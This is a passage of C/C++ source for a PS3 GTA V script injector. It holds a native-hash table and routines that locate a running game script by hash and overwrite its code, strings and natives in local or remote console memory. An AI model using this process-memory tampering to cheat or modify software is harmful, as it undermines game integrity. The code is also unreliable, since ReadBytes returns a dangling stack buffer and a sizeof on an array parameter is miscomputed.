0xA4A75FCF, 0xE6633DCF, 0x9EF0A9CF, 0xDEBEEFCF, 0x80151CCF, 0x5B9B5CF, 0x4C4C10CF, 0x28058ACF, 0xEC2A0ECF, 0x4DC27FCF, 0x58C0F6CF, 0x233C9ACF, 0x482B28D0, 0x4E9776D0, 0x6EFC2FD0, 0x4818ACD0, 0x22E03AD0, 0x85615FD0, 0x98E29ED0, 0x8866D9D0, 0x8F72FAD0, 0x1A7CEBD0, 0x4CDD35D0, 0x1B91CD0, 0x20E2BDD0, 0xE1D91FD0, 0x345F72D0, 0xB8B3A5D0, 0x135B3CD0, 0xC969F2D0, 0x562C4D0, 0xDB75CDD1, 0x7B72AFD1, 0x1984A5D1, 0x90A810D1, 0xFB16C6D1, 0xA688B7D1, 0x9EFBD5D1, 0x410C61D1, 0x2F0A16D1, 0x86E995D1, 0x2F5F1D1, 0x2EAFA1D1, 0xFB2AFED1, 0x15786DD1, 0x8D9FD4D1, 0x66DCD9D2, 0x4E721AD2, 0xBD11A9D2, 0x6CDAA7D2, 0x1B2114D2, 0x532DDD2, 0x3287FD2, 0xA657DD2, 0x2942AAD2, 0x7ABB89D2, 0xB75D4AD2, 0x8EB83D2, 0xF30658D2, 0x7C563CD2, 0x4264CED2, 0xBB2D33D3, 0x5187BED3, 0x46AFFED3, 0xA7D8BCD3, 0xFBF44AD3, 0x4273A8D3, 0x157D44D3, 0xA0FD42D3, 0xCB1CD6D3, 0x3276D9D3, 0xC4736ED3, 0xC4FBBBD3, 0x749929D3, 0xD66AE1D3, 0x6D88BCD3, 0x840D24D3, 0x7F6A60D3, 0x135E7AD4, 0xD820ADD4, 0x9604DAD4, 0xA13045D4, 0x87717DD4, 0x47547D4, 0x680A34D4, 0x9F861FD4, 0xE94E24D4, 0xF65B0D4, 0x3FAC3CD4, 0xFFFC85D4, 0x76751DD4, 0xE38A3AD4, 0xE80CF0D4, 0x38B9B8D4, 0x294405D4, 0x57B8D0D4, 0x52816BD4, 0x98CE21D4, 0x1AA3A0D5, 0x133FF2D5, 0xEC1479D5, 0x120B4ED5, 0x878753D5, 0x8E2C7FD5, 0xE6AAA0D5, 0xCDDB44D5, 0xB52E5ED5, 0x607DC9D5, 0xCD4D9DD5, 0xE10198D5, 0x3C48A3D5, 0xD760CAD5, 0xCAD3E2D5, 0x2705C4D5, 0x2F29F0D5, 0x45472FD5, 0xC1AFABD5, 0x58A80BD5, 0x7B820CD5, 0x1026F0D6, 0x913FD7D6, 0x16A80CD6, 0xC077BCD6, 0x86DAE6D6, 0x2B74A6D6, 0x80DCED6, 0xA7AAA4D6, 0x7842C4D6, 0x6602CED6, 0x3FE33BD6, 0xD732CD6, 0x3083FAD7, 0xA05FEBD7, 0x3FDCC8D7, 0x980D45D7, 0xF02E92D7, 0x59C5FAD7, 0xB536CCD7, 0xA7DF64D7, 0xB74C3BD7, 0x48659CD7, 0xDBE78ED7, 0x2DBF2D7, 0x52E111D7, 0x6253B9D7, 0x20871FD7, 0x198F32D7, 0xB90353D7, 0xF6AAA2D7, 0xA8B917D7, 0x95D3BD8, 0xD17AFCD8, 0x8A632BD8, 0x7B784DD8, 0xFBDE9FD8, 0x27AA14D8, 0xBAF52DD8, 0x2C9A11D8, 0x27A244D8, 0x24E53FD8, 0xF290CFD8, 0xFF545AD8, 0xE4FD20D8, 0x6AB757D8, 0x19EC65D9, 0x400BDDD9, 0x5AA379D9, 0x73722CD9, 0x7186AD9, 0xA40FD5D9, 0x717B87D9, 0x128FED9, 0x9C106AD9, 0x46B62D9, 0x74E8FAD9, 0xEF3B4ED9, 0xAA73DAD9, 0x7EB613D9, 0xFE4A10D9, 0x91AFEFD9, 0x90D3A0D9, 0xC2D54DD9, 0x39784DD9, 0x80471AD9, 0xB6507AD9, 0x3C4CF4D9, 0x20E4FFD9, 0x902BC7D9, 0xE22445DA, 0x3970B0DA, 0x734CFEDA, 0x2A9411DA, 0x44ACC1DA, 0xDB7AECDA, 0xFDF6D8DA, 0x9A01FFDA, 0x6BB5CDA, 0xE566C7DA, 0x36A5F2DA, 0x1CF7D7DA, 0xE495B6DA, 0xB71589DA, 0x48262EDA, 0x935A95DA, 0x49949FDA, 0xF57066DA, 0x88203DDA, 0x21D275DA, 0xEF276DA, 0xD15B46DA, 0x840CB5DA, 0xC3169BDA, 0x6DE3AADA, 0xC6047FDB, 0x3B70D1DB, 0x37C388DB, 0x784944DB, 0xDA9FD9DB, 0x324B56DB, 0x1C4F9FDB, 0x881B1FDB, 0x920AE6DB, 0x80DD15DB, 0x71A5C5DB, 0xA0909ADB, 0xE2FF06DB, 0x3EDEC0DB, 0xD1FA1BDB, 0x444180DB, 0x44018EDB, 0xC3DCBEDB, 0xD5BFCADB, 0x8FDDB5DB, 0xEF9142DB, 0x8EA12EDB, 0x73BCFFDC, 0xE92DC, 0x1C68D9DC, 0xF26CDC, 0x88B13CDC, 0x1FDC75DC, 0xF8BE54DC, 0x40638BDC, 0xD82829DC, 0xFB4000DC, 0xE30A64DC, 0x9699CFDC, 0x7B2A6DC, 0xF1850DDC, 0xD064D4DC, 0xC90B2DDC, 0x625181DC, 0x944BA1DC, 0x212BD0DC, 0x3800C0DC, 0xFD0F7EDD, 0x686672DD, 0xAED73ADD, 0x39E68EDD, 0x7DB578DD, 0x2048A7DD, 0xD576F5DD, 0xBAEC6ADD, 0xD19EF0DD, 0x19991ADD, 0x96C4C4DD, 0x6B4335DD, 0x8C555ADD, 0x5720A5DD, 0xF66E5CDD, 0x7E702CDD, 0x7F8C20DD, 0xA396ACDE, 0x7F85DFDE, 0x20B61DDE, 0x575504DE, 0x20497DE, 0x10CE4BDE, 0x6EAF56DE, 0x9D76D9DE, 0x22E9A9DE, 0xFDA62DE, 0xE50D6DDE, 0xDB18E5DE, 0x885724DE, 0x811373DE, 0x9CDBA8DE, 0x264B45DE, 0xD1E364DE, 0x60B345DE, 0x9207E4DE, 0x827F14DE, 0xBE699BDE, 0xFB1A9CDE, 0x1F6CCDDE, 0xEF63BFDF, 0x60E1FEDF, 0xC7CB8ADF, 0x1BCD3DDF, 0xC80A5DDF, 0x7C6339DF, 0xBA699DDF, 0x9F80F6DF, 0xA03E42DF, 0x2343FFDF, 0xAF8CB3DF, 0xB03BCCDF, 0xC1AD5DDF, 0xD536A1DF, 0xF28254DF, 0x12929BDF, 0x72BEE6DF, 0x317775DF, 0xC8865DF, 0x6B83ABDF, 0xDBCE51E0, 0xCB89CBE0, 0xD938DEE0, 0x18136DE0, 0x5F29A7E0, 0xF2FDF2E0, 0x584463E0, 0x878C2CE0, 0x7FC77E0, 0x35BB4EE0, 0x42CC15E0, 0xCAFE5FE0, 0xB6BE07E0, 0xECE58AE0, 0x64A7A0E0, 0x54E775E0, 0x91ABB8E0, 0x5417E0E0, 0xB32087E0, 0xACF162E0, 0x20A5BDE0, 0x343B4DE0, 0x4A9E9AE0, 0x1C09C9E0, 0xAA2B89E0, 0x518141E0, 0x87871CE0, 0x67649EE0, 0xA1BFD5E0, 0x81216EE0, 0x7EF353E1, 0x5C05B7E1, 0xA850DDE1, 0x3BCDF4E1, 0xD043E8E1, 0xC98160E1, 0x9BE4F7E1, 0xC833BBE1, 0x4A701EE1, 0xD5F1EEE1, 0xD649B7E1, 0x3E263AE1, 0x682CB7E1, 0x5ED49BE1, 0x6F2626E1, 0x52746FE1, 0xFF6191E1, 0xD6A679E1, 0xB103A8E1, 0xCCD525E1, 0x170C6E1, 0x202237E2, 0x2F7836E2, 0x343B27E2, 0xC977D6E2, 0x779A60E2, 0x6E5BDCE2, 0x96E28FE2, 0x9BFC9FE2, 0x611E0BE2, 0x829F2E2, 0x5244F4E2, 0xDB8CB8E2, 0xF2442EE2, 0xB200CE2, 0x8C4B63E2, 0xF015BFE2, 0x50597EE2, 0xC8B514E2, 0x326A17E2, 0xDD1329E2, 0xBE81F1E2, 0x4E372FE2, 0x29850FE2, 0xA19708E3, 0x45975AE3, 0x6C344AE3, 0xCC2356E3, 0x1F3DB3E3, 0xFD517CE3, 0x601C22E3, 0x569E5AE3, 0x30F43FE3, 0x34883DE3, 0x569847E3, 0x9F470BE3, 0x8CD67DE3, 0x79472AE3, 0x3E807FE3, 0x4D5D9EE3, 0x397F06E3, 0x14D3E6E3, 0x9C606EE3, 0x56E75FE4, 0x56F961E4, 0xF379DCE4, 0x684E26E4, 0xF4FD8AE4, 0x3EA7FCE4, 0xF8F515E4, 0x3C5085E4, 0x76C641E4, 0x113EAE4, 0xDEC733E4, 0x3D081FE4, 0xCE5D53E4, 0x6BDE5CE4, 0x714BD6E4, 0xB621E7E4, 0x2E7064E4, 0x4A2100E4, 0xFE576EE4, 0xCCD9ABE4, 0x1F9DE6E4, 0x8F320DE4, 0x903F5EE4, 0xD9969E4, 0x930B3AE5, 0xF1D464E5, 0x832150E5, 0x2F72AE5, 0x17A0BCE5, 0xD656E7E5, 0x8C886BE5, 0x98AA48E5, 0x7D90EEE5, 0xFCE6ECE5, 0x22F865E5, 0x20BFF6E5, 0xA4CA7BE5, 0x9CF1CE5, 0xCA03A1E5, 0xFD64EAE5, 0xF20F72E5, 0x9A29ACE6, 0x486867E6, 0xED159AE6, 0xD348E3E6, 0x5AE68AE6, 0x9DFD89E6, 0x2E079AE6, 0x8F3137E6, 0xFF7D44E6, 0x5F7789E6, 0x59C52BE6, 0x3DDEB0E6, 0x9B76F7E6, 0xB23F46E6, 0x320813E6, 0x92FDBAE6, 0x55461BE6, 0x633179E6, 0x56AFCE6, 0x92B35BE6, 0x4E8E29E6, 0x6F6FC7E6, 0xEF0B78E6, 0xCDEBCCE7, 0xC47352E7, 0x9451EFE7, 0x1ECD23E7, 0xBB1FF6E7, 0x88F0F7E7, 0x9B581DE7, 0x17B99CE7, 0x489E27E7, 0xCD9805E7, 0x1DD01FE7, 0xFA3A16E7, 0xB9392CE7, 0xBB720FE7, 0x83D9FBE7, 0xCCD937E7, 0x4316C9E7, 0x4FD3EE7, 0x96B8BEE8, 0x17F9DFE8, 0x206A58E8, 0xDAA388E8, 0x4F4D76E8, 0x215ABBE8, 0x824EBE8, 0xA27B9FE8, 0x19BB3CE8, 0x84932E8, 0x2B9D91E8, 0xA77F31E8, 0x4BD72FE8, 0xBD96D8E8, 0xA5EDCDE8, 0xCCAA5CE9, 0x82146BE9, 0x234C1AE9, 0x928E12E9, 0x1E11BFE9, 0xC5D8B1E9, 0x83F18EE9, 0x2FB099E9, 0xA8211EE9, 0xCFD6E9, 0xCEDE52E9, 0xC61C75E9, 0xDD8878E9, 0x238FE9, 0xE67446E9, 0x98C5CCE9, 0x24ACC4E9, 0x381AEEE9, 0x136A5BE9, 0x3AA39BE9, 0xD6E3D5EA, 0xC0B971EA, 0x8A6BBDEA, 0xD88EC8EA, 0x3F358BEA, 0xAD1476EA, 0x12B086EA, 0x226B08EA, 0x7158B1EA, 0x7E02FAEA, 0x89C2B5EA, 0x872CF0EA, 0x5F7E23EA, 0x9B6EF0EA, 0x7D0DE7EA, 0xA8B37DEA, 0x36C9A5EA, 0xFE14A8EA, 0x38FC2EEB, 0xC0AB03EB, 0xAB0E79EB, 0xFA037FEB, 0x25D569EB, 0x91A7FCEB, 0x516862EB, 0xF17634EB, 0x9B8631EB, 0x1C70B2EB, 0x249EB4EB, 0x902656EB, 0xBEDEACEB, 0x943A58EB, 0x7357C1EB, 0x95BB67EB, 0xF079E4EB, 0x127310EB, 0x92E7E4EB, 0x84ADF9EB, 0xA817CDEB, 0xDC8239EB, 0xFF1F6AEB, 0xDAFCB3EC, 0xCE17FDEC, 0x942160EC, 0xBA8128EC, 0x4DFD5FEC, 0x8FB923EC, 0x8CC23EEC, 0xA11289EC, 0x928A4DEC, 0x136326EC, 0xCBE09AEC, 0x308ED0EC, 0x53FC3FEC, 0x8AD670EC, 0xF63A13EC, 0xBD3F9EC, 0x211DEFEC, 0x932A6CED, 0xC1FEC5ED, 0xB3EB01ED, 0xBE5CCED, 0xC9EF81ED, 0x50507BED, 0xE5DA4CED, 0x470810ED, 0x813353ED, 0xF3807BED, 0x64D91CED, 0x42B484ED, 0xD41C9AED, 0xCB6C4ED, 0xA3D675ED, 0x5FF6C2ED, 0x365C50EE, 0x3E720BEE, 0xB52F40EE, 0x6E96A1EE, 0x4B67D7EE, 0x7E55A1EE, 0x8D8DF8EE, 0x20E5B3EE, 0x155465EE, 0x3B0171EE, 0x516E30EE, 0xDE7442EE, 0x80275EE, 0x680C90EE, 0x53A879EE, 0xCB415EE, 0x3C395AEE, 0xCFCD35EE, 0x66C1BDEE, 0x34A396EE, 0x60693CEE, 0x630CD8EE, 0x21636EE, 0xEC717AEF, 0x1A1A72EF, 0x54448EF, 0x1E5F6AEF, 0x199E75EF, 0x91EA80EF, 0x50F392EF, 0x1C2B9FEF, 0x71D898EF, 0x57DFB1EF, 0x639AF3EF, 0x304D0EEF, 0x3F436EEF, 0xCBAF2EF, 0x3AF34DEF, 0xF07D8CEF, 0xD4DA14EF, 0x94B75EF, 0xAFA914EF, 0x225380EF, 0x39555CF0, 0xCAB087F0, 0x468668F0, 0x8474E6F0, 0x2086B1F0, 0x374F42F0, 0xF1F5DCF0, 0x9C50FBF0, 0x199FABF0, 0xECD470F0, 0xF6B837F0, 0x990085F0, 0x7983E7F0, 0xFAE5D6F0, 0x8444E1F0, 0xFFDF46F0, 0xC7BD1AF0, 0x2909ABF0, 0x98DD98F1, 0x7FBC86F1, 0x3AC5B2F1, 0xD5A450F1, 0x8E6F2AF1, 0x9B9AFFF1, 0xFCF4DF1, 0xE1A0B2F1, 0x57583DF1, 0x98EFF6F1, 0xC58250F1, 0x57A282F1, 0xF7EB2BF1, 0x497EAFF2, 0xCE9E6CF2, 0x3C5619F2, 0xAD3E05F2, 0x2A6CC9F2, 0xA7B621F2, 0x6CEA96F2, 0xC2CC1DF2, 0x39A0E1F2, 0x1FE547F2, 0xA89A53F2, 0x725ADCF2, 0x618857F2, 0x72FA5EF2, 0x87F767F2, 0x769E5CF2, 0xD72CEF2, 0x72F15F2, 0xC8BAB2F2, 0xCF14D7F2, 0x67785AF2, 0x82BA6F2, 0x40D90BF2, 0x44A153F2, 0xD455A7F3, 0x3FDA00F3, 0x9E68F3, 0xA4EF02F3, 0x391DF4F3, 0xA9A308F3, 0xF23277F3, 0xAB55D8F3, 0xACAB8FF3, 0x598C06F3, 0x345166F3, 0xDDD1F1F3, 0xFC8A71F3, 0xF3A67AF3, 0xB58B8FF3, 0x498849F3, 0xC6BC16F3, 0xC5C3B7F3, 0x86745EF3, 0xD4496BF3, 0x1B3521F4, 0x1084F2F4, 0xBB5498F4, 0xD7F934F4, 0xA92C1AF4, 0xF1EDB7F4, 0x4D3325F4, 0x814A28F4, 0x2DF7AF4, 0x62824EF4, 0x8EE06BF4, 0x9E5629F4, 0x6F2820F4, 0x5B7463F4, 0xD0FC19F4, 0x728B4EF4, 0x9D4934F4, 0x16753CF4, 0x2654A0F4, 0x16F30DF4, 0x1100CAF5, 0xDD7936F5, 0x1604C2F5, 0x56AFB9F5, 0xB72403F5, 0x4AF0ADF5, 0x4FF3D3F5, 0xF79A97F5, 0xFB9BABF5, 0xB52BA5F5, 0xED6F44F5, 0x665A06F5, 0xC99C19F5, 0xF52CD7F5, 0x328E6FF5, 0xCC91FCF5, 0xD6E9FCF5, 0x60B34FF5, 0x67BA6F5, 0x5205C6F5, 0x63BA19F5, 0x284057F5, 0x8EAF9CF6, 0x7C05B1F6, 0x24A7A7F6, 0x210106F6, 0xF60DAAF6, 0xD05EB7F6, 0x97B1CDF6, 0xC67D5CF6, 0xB19215F6, 0xBD4236F6, 0xC08FE5F6, 0x2E19D7F6, 0xB92E5AF6, 0x75E60CF6, 0x3B926F6, 0xAD7C45F6, 0x7B9522F6, 0xF4C211F6, 0x79A6CAF6, 0x65B705F6, 0x308EDF6, 0x2B73BCF6, 0x8BB336F7, 0x725D91F7, 0xB4087F7, 0xBDE749F7, 0x838F7BF7, 0x5B451FF7, 0xB1A52EF7, 0x3A8F1BF7, 0x62073DF7, 0x5BE529F7, 0xC5266BF7, 0x7597A0F7, 0x1A4318F7, 0xF9DC2AF7, 0xE77199F7, 0x507BC6F7, 0xE2DB58F7, 0xD8FEC4F8, 0x262017F8, 0x96F84DF8, 0x511D7EF8, 0xC4D122F8, 0x810158F8, 0x7A6B0EF8, 0xFE39ECF8, 0x41A094F8, 0x95FFACF8, 0x85D134F8, 0xB2BC25F8, 0xE2C9C6F8, 0x95AE00F8, 0x2ED5E2F8, 0x24A97AF8, 0xFE9A39F8, 0xFE1589F9, 0x851687F9, 0x2C959AF9, 0x86DC03F9, 0x8A814FF9, 0x8CD58F9, 0x55CB21F9, 0xE3BD00F9, 0xD7E5CF9, 0xACFEB3F9, 0x3A0B8F9, 0x742043F9, 0x16D7AF9, 0xF557BAF9, 0x42140FF9, 0x961458F9, 0x57E5B3F9, 0xD64C2FA, 0xDBDD79FA, 0x3D3329FA, 0x93C665FA, 0x6BAF95FA, 0x883622FA, 0xB21288FA, 0x85B1C9FA, 0xDDDE26FA, 0x33F43FA, 0xFFDDF8FA, 0x13CAFAFA, 0xAD8383FA, 0xD3874AFA, 0xC70E6CFA, 0x606EE5FA, 0x9CAA05FA, 0x4D6B3BFA, 0x5E93FBFA, 0x144020FA, 0x9D2C94FA, 0x939243FB, 0x4D1EB0FB, 0x146764FB, 0xBD0A67FB, 0x872C2CFB, 0x45F3BDFB, 0x8B02A8FB, 0xB4D3DBFB, 0x24F873FB, 0xB2E1E1FB, 0x55D79DFB, 0xCEAE5AFC, 0xD96860FC, 0xBB120CFC, 0x88CA3BFC, 0xB818C7FC, 0xB6997FC, 0x1A89B5FC, 0xFDC54FC, 0x943A6CFC, 0x4EB7BBFC, 0x2988B3FC, 0xC7FF5AFC, 0x6CC062FC, 0xF60986FC, 0x44473EFC, 0xFE2554FC, 0xA3707DFC, 0xF8A62EFC, 0xF1E0CAFC, 0xB2E686FC, 0xDAF4F8FC, 0x31F951FD, 0x18F03AFD, 0x966C90FD, 0x8E664EFD, 0x9A0840FD, 0x113DF5FD, 0xA7E936FD, 0x30558CFD, 0x7154B6FD, 0xE9C6B3FD, 0xE642F2FD, 0xE0047BFD, 0x5476B9FD, 0x40CE4DFD, 0xF10112FD, 0xCA6E91FD, 0xD4C2EAFD, 0xF87DCFFD, 0xA345EFE, 0x274631FE, 0x766A74FE, 0x9A0E3BFE, 0xB06FE3FE, 0x8A04E1FE, 0x742075FE, 0xA2A5C9FE, 0x66728EFE, 0xE387BFE, 0x6B8F44FE, 0xCE36E3FE, 0xE96C29FE, 0x1FA39EFE, 0xFFF149FE, 0x47C8E5FF, 0xFC30DDFF, 0x621388FF, 0x9DB63CFF, 0xB1E086FF, 0x89AD49FF, 0xCFA613FF, 0x164DDEFF, 0xD9ABB0FF, 0xF0E94FF, 0x5B90B5FF, 0xD5842BFF, 0x407C47FF, 0x7D95AFFF, 0x850690FF, 0xB630E5FF, 0x9A2180FF, 0x9678D4FF };
	//static unsigned int allNativesAddresses[] = {5,4,6};
	//static unsigned int allNativesHashes[] = {0,1,2};



#ifdef selfVersionOfInnject


	int rsc7 = 0;


	uint ReadUInt32(char* file, uint pos, bool pointer)
	{
		int offset = pos + rsc7;
		char buf[4];
		readFile(file, buf, 4, offset);
		if (pointer && buf[0] == 0x50)
			buf[0] = 0x0;
		return *(uint*)((int)buf);
	}

	char* ReadBytes(char* file, uint pos, int length) {
		char buffer[0x4000 + 0x1000];//0x4000 is the max read...
		readFile(file, buffer, length, pos + rsc7);
		return buffer;
	}

	int ArraydotIndexOf(unsigned int allNativesHashes[], int find) {
		//printf("Size of native hashes total: %i\n", sizeof(allNativesHashes) / sizeof(unsigned int));
		for (int i = 0; i < sizeof(allNativesHashes) / sizeof(unsigned int); i++) {
			if (allNativesHashes[i] == find)
				return i;
		}
		return -1;
	}

	void PS3dotSetMemory(int addressWrite, char* data, int size) {//local
		for (int i = 0; i < size; i++) {
			*(char*)(addressWrite + i) = data[i];
		}
	}

	void inject(char* file, bool checkNatives, /*int N4rage10scrProgramEValue, */char* overriteScriptName) {

		uint pointer = (uint)getN4rage10scrProgramE(GAMEPLAY::GET_HASH_KEY(overriteScriptName));//N4rage10scrProgramEValue;

		if (!VALID_ADDR(pointer)) {
			//printf("Invalid pointer! %s\n", overriteScriptName);
			return;
		}

		//printf("Overriting script at 0x%X\n", pointer);


		rsc7 = 0;

		if (ReadUInt32(file, 0, false) == 0x52534337)
			rsc7 = 16;
		uint nativeCount = ReadUInt32(file, 0x20, false);
		uint nativePointer = ReadUInt32(file, 0x2C, true);//should be 0x02 B2 80


		/*uint nativesInScript[4000] = {0};//lol definitely not 4000 but fuck using 'new'

		bool stop = false;
		for (uint i = 0; i < nativeCount; i++)
		{
			int index = ArraydotIndexOf(allNativesHashes, ReadUInt32(file, nativePointer + (i * 4), false));
			if (index != -1)
				nativesInScript[i] = allNativesAddresses[index];
			else if (checkNatives)
			{
				stop = true;
				printf("Error native 0x%X not found\n",nativesInScript[i]);
			}
		}
		if (stop)
		{
			printf("ERror finished injecting\n");
			return;
		}*/

		//printf("a\n");
		if (*(unsigned int*)(pointer + 0x20) < nativeCount) {
			//printf("ERROR: Script %s has native count %i but requires %i\n", overriteScriptName, *(unsigned int*)(pointer + 0x20), nativeCount);
			return;
		}
		//*(unsigned int*)(pointer + 0x20) =  nativeCount;
		//*(unsigned int*)(pointer + 0x2C) =  nativePointer + pointer;
		uint memNativePointer = *(unsigned int*)(pointer + 0x2C);
		uint codeLength = ReadUInt32(file, 0x10, false);
		*(unsigned int*)(pointer + 0x10) = codeLength;
		uint stringLength = ReadUInt32(file, 0x48, false);
		*(unsigned int*)(pointer + 0x48) = stringLength;
		uint staticCount = ReadUInt32(file, 0x18, false);
		*(unsigned int*)(pointer + 0x18) = staticCount;
		//printf("b\n");
		for (uint i = 0; i < nativeCount; i++)
			*(unsigned int*)(memNativePointer/*nativePointer + pointer*/ + (i * 4)) = getOPDOfNative(ReadUInt32(file, nativePointer + (i * 4), false)); //nativesInScript[i];

		//printf("l\n");




		uint codePointerList = ReadUInt32(file, 8, true);
		//*(unsigned int*)(pointer + 8) =  codePointerList + pointer;
		int memCodePointerList = *(unsigned int*)(pointer + 8);//array of page pointers
		//printf("m\n");
		for (uint i = 0; i < (codeLength / 0x4000) + 1; i++)
		{
			uint codePagePointer = ReadUInt32(file, codePointerList + (i * 4), true);
			//*(unsigned int*)(codePointer + pointer + (i * 4)) =  codePagePointer + pointer;
			//printf("n\n");
			//br.BaseStream.Position = codePagePointer + rsc7;
			//Console.WriteLine("0x" + (codePagePointer + pointer).ToString("X"));
			//int codePtr = *(unsigned int*)(codePointer + pointer + (i * 4));
			int memCodePagePointer = *(int*)(memCodePointerList + (i * 4));
			if (memCodePagePointer == 0) {
				//printf("ERROR: Code page %i is not valid!\n", i);
				return;
			}
			if (i == codeLength / 0x4000) {
				char* bytes = ReadBytes(file, codePagePointer, (int)codeLength % 0x4000);
				PS3dotSetMemory(memCodePagePointer/*codePagePointer + pointer*/, bytes, (int)codeLength % 0x4000);
			}
			else {
				char* bytes = ReadBytes(file, codePagePointer, 0x4000);
				PS3dotSetMemory(memCodePagePointer/*codePagePointer + pointer*/, bytes, 0x4000);
			}
		}

		//printf("u\n");

		uint stringPointer = ReadUInt32(file, 0x44, true);
		//*(unsigned int*)(pointer + 0x44) =  stringPointer + pointer;
		int memStringPointer = *(unsigned int*)(pointer + 0x44);//array of page pointers
		for (uint i = 0; i < (stringLength / 0x4000) + 1; i++)
		{
			uint stringPagePointer = ReadUInt32(file, stringPointer + (i * 4), true);
			//*(unsigned int*)(stringPointer + pointer + (i * 4)) =  stringPagePointer + pointer;
			//int strPtr = *(unsigned int*)(stringPointer + pointer + (i * 4));
			//br.BaseStream.Position = stringPagePointer + rsc7;                
			//printf("v\n");
			int strPtr = *(int*)(memStringPointer + (i * 4));
			if (strPtr == 0) {
				//printf("ERROR: String page %i is not valid!\n", i);
			}
			if (i == stringLength / 0x4000) {
				char* bytes = ReadBytes(file, stringPagePointer, (int)stringLength % 0x4000);
				PS3dotSetMemory(strPtr/*stringPagePointer + pointer*/, bytes, (int)stringLength % 0x4000);
			}
			else {
				char* bytes = ReadBytes(file, stringPagePointer, 0x4000);
				PS3dotSetMemory(strPtr/*stringPagePointer + pointer*/, bytes, 0x4000);
			}
			//printf("w\n");
		}



		//printf("x\n");

		uint staticPointer = ReadUInt32(file, 0x24, true);
		*(unsigned int*)(pointer + 0x24) = staticPointer + pointer;
		//br.BaseStream.Position = staticPointer + rsc7;
		char* bytes64536 = ReadBytes(file, staticPointer, (int)staticCount * 4);
		PS3dotSetMemory(staticPointer + pointer, bytes64536, (int)staticCount * 4);

		//printf("y\n");

		/*
		uint unknownPointer = ReadUInt32(file, 4, true);
		*(unsigned int*)(pointer + 4) =  unknownPointer + pointer;
		//br.BaseStream.Position = unknownPointer + 4 + rsc7;
		//PS3.Extension.WriteByte(unknownPointer + pointer + 4, br.ReadByte());

		*(unsigned char*)(unknownPointer + pointer + 4) = ReadBytes(file,unknownPointer + 4,1)[0];
		*/

		/*
		uint scriptnamePointer = ReadUInt32(file, 0x40, true);//this is actually correct
		*(unsigned int*)(pointer + 0x40) =  scriptnamePointer + pointer;
		//PS3.Extension.WriteString(scriptnamePointer + pointer, "script_injector");
		strcpy((char*)(scriptnamePointer + pointer),overriteScriptName/"script_injector"/);
		*/

		//br.Close();

		//Console.WriteLine(Program.strTraduction("injected"));
		//printf("z\n");


	}

#else


	int rsc7 = 0;


	uint ReadUInt32(char* file, uint pos, bool pointer)
	{
		int offset = pos + rsc7;
		char buf[4];
		readFile(file, buf, 4, offset);
		if (pointer && buf[0] == 0x50)
			buf[0] = 0x0;
		return *(uint*)((int)buf);
	}


	char* ReadBytes(char* file, uint pos, int length) {
		char buffer[0x4000 + 0x1000];//0x4000 is the max read...
		readFile(file, buffer, length, pos + rsc7);
		return buffer;
	}


	int amountToSkipBy = 5;

	void ReadBytesToMem(char* file, int startReadOffset, int length, int addressInTheirMemory, float* percentPointer = 0) {
		
		const int readSize = maxIntsPerPacket * 4   * amountToSkipBy;
		int lengthLeft = length;
		for (int i = 0; i < length; i += readSize) {

			if (percentPointer != 0) {
				*percentPointer = (float)(i) / (float)length;
			}

			char buffer[readSize];
			int rs = readSize;
			if (lengthLeft < rs)
				rs = lengthLeft;
			lengthLeft -= readSize;

			readFile(file, buffer, rs, i + startReadOffset + rsc7);
			write(addressInTheirMemory + startReadOffset + i, buffer, rs, amountToSkipBy/*send 5 packets then wait, intstead of default of 1 and waiting. should speed it up with possible loss of data*/);
		}
	}

	void PS3dotSetMemory(int addressWrite, char* data, int size) {
		//printf("Data writing: 0x%X\n Size: %i\n", data, size);
		write(addressWrite, data, size, amountToSkipBy/*send 5 packets then wait, instead of default of 1 and waiting*/);

		/*size += (sizeof(int)-(size%sizeof(int)));

		const int sizePerWrite = 100;

		int *data = (int*)dataa;
		size = size / 4;
		int tmpBuf[sizePerWrite];
		int sizeLeft = size;
		for (int i = 0; i < size; i+=sizePerWrite) {
			memcpy(tmpBuf,&data[i],sizePerWrite*sizeof(int));

			int wSize = sizePerWrite;
			if (sizeLeft < sizePerWrite) {
				wSize = sizeLeft;
			}

			write(addressWrite+(i*sizeof(int)),tmpBuf,wSize);

			sizeLeft-=sizePerWrite;
		}*/
	}

	unsigned int ReadUInt32Mem(unsigned int address) {
		return read32(address);
	}

	void SetUInt32Mem(unsigned int address, unsigned int value) {
		write(address, (char*)&value, sizeof(int));
	}

	//recreation of 9B45E4 getN4rage10scrProgramE
	int findScriptAddressRemote(int scriptNameHash) {
		int origHash = scriptNameHash;
		scriptNameHash = scriptNameHash & 0x1F;
		int baseAddressToSearchOn = isBLUSVersionOfGame ?/*BLUS*/0x1E7FF8C : 0x1E6FB8C/*BLES*/;
		int specialaddr = baseAddressToSearchOn + scriptNameHash + 1;
		int off = specialaddr % 4;
		//printf("Real: 0x%X, off: 0x%X, aligned: 0x%X\n", specialaddr, off, specialaddr - off);

		int foundVal = ReadUInt32Mem(specialaddr - off);

		if (!VALID_ADDR(foundVal)) {
			//printf("error not valid!\n");
			return 0;
		}

		char* arr = (char*)&foundVal;
		char valueRead = arr[off];
		int rageScript = 0;
		while (true) {
			int newaddr = baseAddressToSearchOn + (valueRead << 2);
			//printf("Checking address: 0x%X, off 0x%X\n", newaddr, valueRead);

			rageScript = ReadUInt32Mem(newaddr + 0xA4);//I guess this froze
			if (VALID_ADDR(rageScript)) {

				unsigned int scriptHashRead = ReadUInt32Mem(rageScript + 0x38);
				if (origHash == scriptHashRead) {
					return rageScript;
				}
				else {
					//printf("Hashes not matching: r:0x%X s:0x%X\n", scriptHashRead, origHash);
				}
			}
			else {
				//printf("FATAL ERROR: Unexpected bad value read! *(int*)(0x%X+0xA4) = unexpected 0x%X\n", newaddr, rageScript);
			}
			int r3 = baseAddressToSearchOn + valueRead + 0x21;
			off = r3 % 4;
			int gotten = ReadUInt32Mem(r3 - off);
			char* arr = (char*)&gotten;
			valueRead = arr[off];
			if (valueRead == 0)
				return 0;
		}
		return rageScript;
	}

	void inject(char* file, bool checkNatives, unsigned int scriptHash) {

		//uint pointer = (uint)getN4rage10scrProgramE(GAMEPLAY::GET_HASH_KEY(overriteScriptName));//NEED TO UPDOOT THIS
		uint pointer = findScriptAddressRemote(scriptHash/*0xa57e7489*/);
		if (!VALID_ADDR(pointer)) {
			//printf("Invalid script pointer! 0x%X\n", pointer);
			return;
		}

		unsigned int scriptHashRead = ReadUInt32Mem(pointer + 0x38);
		if (scriptHashRead != scriptHash) {
			//printf("Script hash found is not correct! 0x%X found but want 0x%X\n", scriptHashRead, scriptHash);
			return;
		}

